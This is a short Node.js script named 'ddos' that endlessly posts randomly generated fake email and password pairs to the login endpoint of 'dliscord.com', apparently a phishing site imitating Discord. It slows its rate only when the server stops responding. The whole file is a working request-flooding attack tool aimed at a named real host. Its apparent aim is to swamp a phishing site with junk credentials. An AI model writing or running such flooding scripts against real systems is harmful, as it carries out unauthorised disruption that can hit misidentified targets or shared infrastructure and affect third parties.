const axios = require('axios');
const url = 'https://dliscord.com/discord/login';
let timeout = 50;

async function ddos() {
    while (true) {
        const nonce1 = Math.random().toString(36).substring(2, 4);
        const nonce2 = Math.random().toString(36).substring(2, 3);
        const nonce3 = Math.random().toString(36).substring(2,5);
        const data = {
            login: `${nonce3}sdfik${nonce1}e@gmail.com`,
            password: `${nonce2}loe${nonce3}td${nonce2}`
        };
        axios.post(url, data)
        .then(resp =>{
            console.log(resp);
        })
        .catch(err =>{
            timeout = err.response ? 50 : 2000;
            console.log('Sent Request!', err.response ? err.response.status : "Server Appears to be dead, request speed slowed down");
        });
        await new Promise(resolve => setTimeout(resolve, timeout));
    }
}
ddos();